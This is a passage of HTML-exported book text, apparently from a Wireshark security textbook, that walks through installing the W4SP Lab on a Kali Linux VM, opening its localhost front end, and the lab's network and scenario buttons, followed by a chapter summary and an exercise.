style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-44</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="779"  height="586"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker105306.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.7000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark181" ></a><span><a href="#_bookmark180" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-44:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Opening Terminal</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A Terminal window opens, starting with you in the directory /w4sp- lab. The downloaded file is in the Downloads directory. To unzip the file, first enter the command </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >cd Downloads</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, then the command </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >unzip w4sp-lab-master.zip</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, as shown in<a name="_bookmark182" ></a>&nbsp;</span><span><a href="#_bookmark184" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-45</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section87" ><p class=MsoBodyText  style="margin-left:21.5000pt;" ><img width="737"  height="493"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker105652.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark184" ></a><span><a href="#_bookmark182" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-45:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Unzipping the W4SP Lab</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:9.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The zipped file expands into its own directory, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >/w4sp-lab-master/</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ls </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command will list the files. Type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >ls </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to see the files, including the installation script, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp_webapp.py</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now it&#8217;s time to run the Lab installation script. In the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp-lab-master </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >directory, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >python w4sp_webapp.py </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to run the Python script. The Terminal window should be similar to<a name="_bookmark185" ></a>&nbsp;</span><span><a href="#_bookmark186" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-46</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section88" ><p class=MsoBodyText  style="margin-left:20.7500pt;" ><img width="739"  height="494"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker106127.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark186" ></a><span><a href="#_bookmark185" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-46:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Running the W4SP Lab installation script</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:8.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The installation will take several minutes, echoing on the screen the script&#8217;s progress through its steps. Be aware that there will be only minor screen activity during when Docker is building the images. (You will recognize this when the more recent screen statements mention &#8220;images found, building now&#8221; and slowly listing the base, switch, victim images, and so on.) It could take 10&#8211;20 minutes for most peoples&#8217; lab installs to finish.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="224"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker106656.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You will know the W4SP Lab installation is finished when the final line confirms the installation and opens the browser. The browser should</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section89" ><p class=MsoNormal  style="margin-top:4.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >open to go to the localhost, port 5000: </span><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >http://127.0.0.1:5000</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:14.5500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Setting Up the W4SP Lab</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The W4SP Lab was developed as a learning tool. Many books out there can teach a subject through text, figures, and otherwise </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >showing </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the material. But it&#8217;s something special to be able to </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >demonstrate </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >that material. This lab gives you the environment to trial and demonstrate what&#8217;s covered in the book&#8212;and much more, obviously.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After the W4SP Lab is installed, the web browser is launched. The browser opens to the localhost at port 5000. The browser presents the front end for the W4SP Lab. After briefly looking it over, click the SETUP button on the left. Setup will start, as shown in<a name="_bookmark188" ></a>&nbsp;</span><span><a href="#_bookmark189" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-47</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="779"  height="586"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker107520.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:9.4500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark189" ></a><span><a href="#_bookmark188" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-47:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Running the W4SP Lab setup</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><a name="_bookmark190" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In about a minute or less, setup will be complete and the Lab installed</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section90" ><p class=MsoBodyText  style="margin-top:3.5500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and ready to go. We will return to the Lab on multiple occasions throughout the book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The W4SP Lab facilitates certain attacks (with the associated traffic) with confidence because whatever systems are needed per attack, the Lab creates those systems. Throughout this book, you will be tasked with exercises and read through demonstrations, both of which will require a system or group of systems. In some exercises it might be necessary to set up certain customizations or additional systems. In those cases you will be instructed to press a button on this W4SP Lab browser page to set up the needed changes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Disclaimer</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >: The Lab is a continual work in progress and will be updated and fixed as time goes on. If at any point there is a discrepancy between what you are seeing in the book and in the lab, you can always refer to the GitHub project Wiki for details on any changes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >The Lab Network</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once the setup procedure finishes, the network diagram, which was one system (the local Kali box), has now grown to multiple systems, as shown in<a name="_bookmark191" ></a>&nbsp;</span><span><a href="#_bookmark192" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-48</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section91" ><p class=MsoBodyText ><img width="779"  height="586"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker108755.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark192" ></a><span><a href="#_bookmark191" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-48:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The full W4SP Lab network</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><a name="_bookmark193" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first thing you&#8217;ll notice after setup completes is the network diagram in the middle of the screen. Each circle denotes a device, be it a switch (sw1, sw2) or router (r1, r2), servers of various services (ftp1, ftp2, smb2, and so on), or a victim machine (vic1, vic2, and so on).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The network topology is not fixed in the W4SP Lab. The topology changes according to what&#8217;s needed for different scenarios. Of course, we&#8217;ll get more into each scenario as we first use them in later chapters. The red buttons on the right will customize the lab to prepare for particular exercises and demonstrations. For example:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:52.5000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker109443.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Start mitm&#8212;Places Kali VM for a man-in-the-middle</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >attack (</span><span><a href="#_bookmark368" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.1000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker109546.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Start ips&#8212;Launches an intrusion detection/prevention</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >system (</span><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.1000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section92" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:114.0000pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:17.2500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker109653.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:58.5000px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker109654.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Start sploit&#8212;Launches Metasploitable (</span><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). Start elk&#8212;Launches the Elastic Stack (</span><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >On occasion, however, we noticed it should have changed but didn&#8217;t. In that case, it might be necessary to click REFRESH on the left to jog it a bit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Summary" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark194" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this chapter, you understood the benefits of virtualization and why it provides a flexible and secure working environment. You gained a working knowledge of virtualization and installed a mainstream platform for hosting VMs, VirtualBox from Oracle. You then installed the Extension Pack for VirtualBox.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You created a VM, allowing for a 64-bit installation of Debian Linux. During the VM setup, you configured the allocated memory, drive space, and processor settings to ensure it would run as needed. In your first VM, you installed Kali Linux from an ISO image. You configured Kali from the start, setting up the hostname, partitioning the disk, and installing the GRUB boot loader.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Given the Kali Linux machine, you then went to GitHub for the source code of our Wireshark for Security Professionals Lab. After an introduction to GitHub and the containerization software Docker, you installed the W4SP Lab on the Kali Linux VM. Lastly, we briefly introduced the layout of the W4SP Lab front end.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the </span><span><a href="#_bookmark198" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we must prepare ahead of the book&#8217;s exercises and labs involving packet analysis and network investigation. To ensure everyone is at the same level for the analysis, we cover a wide range of network fundamentals, plus information security and attack concepts.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Exercises" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark195" ></a>Exercises</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=17  style="margin-top:9.0000pt;margin-right:7.2500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;line-height:17.3000pt;mso-line-height-rule:exactly;mso-list:l6 level1 lfo2;" ><a name="_bookmark196" ></a><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Build a second VM on VirtualBox. Know any other ISO images? If not, browse here for many great ideas:</span><span><a href="https://www.reddit.com/r/computertechs/comments/1g1z7q/index_of_useful_isos_for_technicians/" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.0500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://www.reddit.com/r/computertechs/comments/1g1z7q/index_o</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(Beware of massive free time</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >lost.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
